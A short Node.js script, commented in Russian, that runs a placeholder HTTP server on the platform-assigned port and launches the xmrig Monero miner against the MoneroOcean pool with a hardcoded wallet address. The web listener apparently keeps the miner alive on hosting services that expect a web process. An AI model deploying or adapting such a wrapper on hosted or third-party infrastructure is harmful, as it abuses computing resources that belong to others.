const http = require('http');
const { spawn } = require('child_process');

const port = process.env.PORT || 3000;

// HTTP-сервер, который отвечает "OK" на любые запросы
const server = http.createServer((req, res) => {
  res.writeHead(200, { 'Content-Type': 'text/plain' });
  res.end('Miner is running\n');
});

server.listen(port, '0.0.0.0', () => {
  console.log(`✅ HTTP server ready on port ${port}`);
  
  // Запускаем майнер как дочерний процесс
  const miner = spawn('/usr/local/bin/xmrig', [
    '-o', 'gulf.moneroocean.stream:10004',
    '-u', '48oFiSuK4K4WBpQ29kx73CBRtSpm132W2hoXr9RyfUbUCrbvgqLV9PBH1aqyckZemdabBjrwM2D3YieJQD6CKiGZVgkxU36',  // ЗАМЕНИ НА СВОЙ
    '-p', 'x',
    '-k',
    '-t', '2'
  ], { stdio: 'inherit' });

  miner.on('error', err => console.error('❌ Miner error:', err));
  miner.on('exit', code => {
    console.log(`⛔ Miner exited with code ${code}`);
    process.exit(code);
  });
});

// Корректное завершение при SIGTERM
process.on('SIGTERM', () => {
  console.log('Shutting down...');
  server.close(() => process.exit(0));
});
